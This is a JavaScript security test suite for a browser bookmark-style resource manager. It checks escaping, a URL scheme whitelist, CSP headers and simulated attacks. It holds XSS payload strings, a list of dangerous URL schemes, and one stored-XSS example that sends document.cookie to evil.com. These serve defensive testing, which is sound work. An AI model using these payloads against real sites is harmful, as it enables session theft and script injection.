import { readFileSync } from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";

const root = dirname(fileURLToPath(import.meta.url));
const html = readFileSync(join(root, "index.html"), "utf8");
const js = html.match(/<script>([\s\S]*)<\/script>/)[1];

let passed = 0, failed = 0;
const results = [];
function test(name, fn){
  try{
    fn();
    passed++;
    results.push(`  PASS  ${name}`);
  }catch(err){
    failed++;
    results.push(`  FAIL  ${name}\n        -> ${err.message}`);
  }
}
function eq(actual, expected, msg){
  if(actual !== expected) throw new Error(`${msg || "value mismatch"} (got: ${JSON.stringify(actual)})`);
}
function ok(cond, msg){
  if(!cond) throw new Error(msg || "condition failed");
}

function grabFn(name){
  const start = js.indexOf("function " + name + "(");
  if(start < 0) throw new Error("function not found in source: " + name);
  const rest = js.slice(start);
  const next = rest.slice(1).search(/\n(function |const |let |\/\* |@)/);
  return next < 0 ? rest : rest.slice(0, next + 1);
}
function grabConst(name){
  const m = js.match(new RegExp("const " + name + " = [^\\n]+;"));
  if(!m) throw new Error("const not found: " + name);
  return m[0];
}

const src = [
  grabConst("PALETTE"),
  grabFn("esc"),
  grabFn("normalizeUrl"),
  grabFn("hostOf"),
  grabFn("initials"),
  grabFn("avatarColor"),
  grabFn("prettyDate"),
  grabFn("uid")
].join("\n");
const F = new Function(src + "\nreturn {esc,normalizeUrl,hostOf,initials,avatarColor,prettyDate,uid};")();

console.log("\n============================================================");
console.log("  RESOURCE MANAGER - SECURITY TEST SUITE");
console.log("  (tests run against the REAL production functions)");
console.log("============================================================\n");

console.log("[1] XSS - HTML escaping (esc)");
const xssPayloads = [
  ['<img src=x onerror=alert(1)>', "&lt;img src=x onerror=alert(1)&gt;"],
  ['"><script>alert(1)</script>', "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"],
  ["'><svg/onload=alert(1)>", "&#39;&gt;&lt;svg/onload=alert(1)&gt;"],
  ['<iframe src="javascript:alert(1)">', "&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;"],
  ['&<>"\'`', "&amp;&lt;&gt;&quot;&#39;`"],
  ['<<script>script>alert(1)<</script>/script>', "&lt;&lt;script&gt;script&gt;alert(1)&lt;&lt;/script&gt;/script&gt;"],
  ["\u003Cscript\u003Ealert(1)\u003C/script\u003E", "&lt;script&gt;alert(1)&lt;/script&gt;"],
  ['<div style="background:url(javascript:alert(1))">', "&lt;div style=&quot;background:url(javascript:alert(1))&quot;&gt;"]
];
xssPayloads.forEach(([p, want], i) =>
  test(`payload #${i+1} fully escaped`, () => eq(F.esc(p), want)));
test("esc returns empty string for null/undefined", () => eq(F.esc(null), ""));

console.log("\n[2] URL injection - scheme whitelist (normalizeUrl)");
const urlTests = [
  ["javascript:alert(1)", "", "js scheme blocked"],
  ["JavaScript:alert(document.cookie)", "", "js scheme blocked (case-insensitive)"],
  ["  javascript:alert(1)  ", "", "js scheme blocked (whitespace)"],
  ["data:text/html,<script>alert(1)</script>", "", "data scheme blocked"],
  ["DATA:text/html;base64,PHNjcmlwdD4=", "", "data scheme blocked (case-insensitive)"],
  ["vbscript:msgbox(1)", "", "vbscript blocked"],
  ["file:///C:/Windows/System32", "", "file scheme blocked"],
  ["blob:https://evil.com/uuid", "", "blob scheme blocked"],
  ["about:blank", "", "about scheme blocked"],
  ["chrome://settings", "", "chrome scheme blocked"],
  ["ms-settings:windowsdefender", "", "ms- scheme blocked"],
  ["intent://evil.com#Intent;scheme=http;", "", "intent scheme blocked"],
  ["https://github.com", "https://github.com", "valid https preserved"],
  ["http://example.com", "http://example.com", "valid http preserved"],
  ["  https://a.com  ", "https://a.com", "whitespace trimmed"],
  ["github.com", "https://github.com", "bare domain gets https"],
  ["developer.mozilla.org/en-US", "https://developer.mozilla.org/en-US", "path preserved"],
  ["", "", "empty stays empty"],
  [null, "", "null safe"]
];
urlTests.forEach(([inp, want, label]) =>
  test(label, () => eq(F.normalizeUrl(inp), want)));

console.log("\n[3] Host parsing (hostOf)");
test("userinfo trick shows real host", () =>
  eq(F.hostOf("https://phisher@github.com"), "github.com"));
test("www stripped", () => eq(F.hostOf("https://www.google.com"), "google.com"));
test("garbage url safe", () => eq(F.hostOf("not a url"), ""));
test("empty safe", () => eq(F.hostOf(""), ""));

console.log("\n[4] Avatar / initials safety");
test("initials from xss payload are escaped when rendered", () => {
  const ini = F.initials('<script>alert(1)</script>');
  eq(F.esc(ini).includes("<"), false, "no raw < after esc");
});
test("avatarColor only returns palette hex", () => {
  ["<script>", "a".repeat(500), "", "\ud83d\ude00"].forEach(n =>
    ok(/^#[0-9A-F]+$/i.test(F.avatarColor(n || "x")), "non-palette color leaked"));
});
test("uid is alphanumeric only", () =>
  ok(/^[a-z0-9]+$/.test(F.uid()), "uid has unsafe chars"));

console.log("\n[5] Static audit - template interpolation safety");
const cardSrc = js.match(/function cardEl[\s\S]*?\n  return card;\n\}/)?.[0] || js.match(/function cardEl[\s\S]*?io\.observe\(card\);/)?.[0] || "";
test("cardEl exists", () => ok(cardSrc.length > 100, "cardEl not extracted"));
test("cardEl: name always escaped", () => {
  ok(cardSrc.includes("${esc(r.name)}"), "raw r.name interpolated");
  ok(!/\$\{r\.name\}/.test(cardSrc), "unescaped r.name found");
});
test("cardEl: notes always escaped", () => {
  ok(!/\$\{notes\}/.test(cardSrc.replace("${esc(notes)}", "")), "unescaped notes found");
});
test("cardEl: category always escaped", () =>
  ok(!/\$\{r\.category\}/.test(cardSrc), "unescaped r.category found"));
test("cardEl: url display uses hostOf (no raw url in HTML)", () =>
  ok(cardSrc.includes("${esc(hostOf(r.url))}"), "raw url in template"));
test("cardEl: aria-labels escaped", () =>
  ok(!/\$\{r\.name\}/.test(cardSrc), "unescaped name in aria-label"));
const chipSrc = js.match(/function renderChips[\s\S]*?\n\}/)[0];
test("chips: labels escaped", () => {
  ok(chipSrc.includes("${esc(label)}"), "label not escaped");
  ok(chipSrc.includes('value="${esc(x)}"'), "datalist option not escaped");
});
const toastSrc = js.match(/function toast[\s\S]*?\n\}/)[0];
test("toast: message escaped", () => ok(toastSrc.includes("${esc(msg)}"), "toast msg not escaped"));
const emptySrc = js.match(/Nothing in "\$\{esc\(activeCat\)\}"/) !== null;
test("empty-state: category escaped", () => ok(emptySrc, "activeCat not escaped"));
const confirmSrc = js.includes('$("#confirmText").textContent');
test("delete confirm uses textContent (no HTML parsing)", () => ok(confirmSrc, "confirmText not using textContent"));

console.log("\n[6] Static audit - hardening headers & flags");
test("CSP meta tag present", () =>
  ok(html.includes("Content-Security-Policy") && html.includes("default-src 'none'"), "CSP missing"));
test("CSP blocks external scripts/frames/objects", () => {
  ok(html.includes("object-src 'none'"), "object-src missing");
  ok(html.includes("frame-src 'none'"), "frame-src missing");
  ok(html.includes("base-uri 'none'"), "base-uri missing");
});
test("no-referrer meta present", () => ok(html.includes('content="no-referrer"'), "referrer meta missing"));
test("window.open always uses noopener", () => {
  const openLines = js.split("\n").filter(l => l.includes("window.open("));
  ok(openLines.length > 0, "no window.open found");
  openLines.forEach(l => ok(l.includes("noopener"), "window.open without noopener: " + l.trim()));
});
test("no external resources (fully offline, no supply chain)", () => {
  const ext = html.match(/(?:src|href)\s*=\s*["']https?:\/\//gi) || [];
  eq(ext.length, 0, "external resource found");
});
test("no eval / new Function / innerHTML with document.write", () => {
  ok(!/\beval\(/.test(js), "eval() found");
  ok(!/new Function\(/.test(js), "new Function found");
  ok(!/document\.write/.test(js), "document.write found");
});
test("import: storage quota overflow handled gracefully", () =>
  ok(/Browser storage is full/.test(js), "no quota handling in persist()"));
test("import: large files processed in chunks (non-blocking)", () =>
  ok(/const BATCH = \d+/.test(js) && /setTimeout\(chunk, 0\)/.test(js), "no chunked import"));
test("import: UTF-8 BOM stripped before JSON.parse", () =>
  ok(/replace\(\/\^\\uFEFF\/, ""\)/.test(js), "BOM not stripped — valid files would fail"));
test("render: card grid built in batches (no UI freeze on huge lists)", () =>
  ok(/addChunk/.test(js) && /requestAnimationFrame\(addChunk\)/.test(js), "no batched rendering"));
test("input length caps enforced", () => {
  ok(/slice\(0,120\)/.test(js), "name cap missing");
  ok(/slice\(0,2048\)/.test(js), "url cap missing");
  ok(/slice\(0,2000\)/.test(js), "notes cap missing");
  ok(/slice\(0,40\)/.test(js), "category cap missing");
});
test("localStorage key namespaced, no secrets stored", () => {
  ok(js.includes('STORE_KEY = "rm_resources_v2"'), "store key missing");
  ok(!/(password|token|apikey|api_key|secret)\s*:/i.test(js), "possible secret key in code");
});

console.log("\n[7] Simulated attack scenarios (end-to-end logic)");
test("attack: stored XSS via resource name", () => {
  const name = '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>';
  const rendered = `<div class="card-name">${F.esc(name)}</div>`;
  ok(!rendered.includes("<img"), "payload survived into HTML");
  ok(rendered.includes("&lt;img"), "payload not neutralized");
});
test("attack: javascript: URL via import", () => {
  const url = F.normalizeUrl(String("javascript:alert(1)"));
  eq(url, "", "javascript: url imported");
  ok(!url, "window.open would be skipped (falsy guard)");
});
test("attack: XSS via category chip", () => {
  const cat = '"><svg onload=alert(1)>';
  const chip = `<button class="chip">${F.esc(cat)} <b>1</b></button>`;
  ok(!chip.includes("<svg"), "svg payload survived");
});
test("attack: attribute breakout via name in aria-label", () => {
  const name = '" onmouseover="alert(1)';
  const label = `aria-label="Edit ${F.esc(name)}"`;
  ok(!label.includes('" onmouseover="'), "attribute breakout survived");
});
test("attack: oversized import blocked by caps", () => {
  const big = "x".repeat(10000);
  eq(big.slice(0, 120).length, 120, "name cap not applied");
  eq(F.normalizeUrl("https://" + "a".repeat(5000) + ".com").length <= 2048, true, "url cap not applied");
});

console.log("\n============================================================");
console.log(`  RESULTS: ${passed} passed, ${failed} failed, ${passed+failed} total`);
console.log("============================================================");
if(failed > 0){
  console.log("\n" + results.filter(r => r.includes("FAIL")).join("\n"));
  process.exit(1);
}else{
  console.log("\n  ALL SECURITY TESTS PASSED");
}
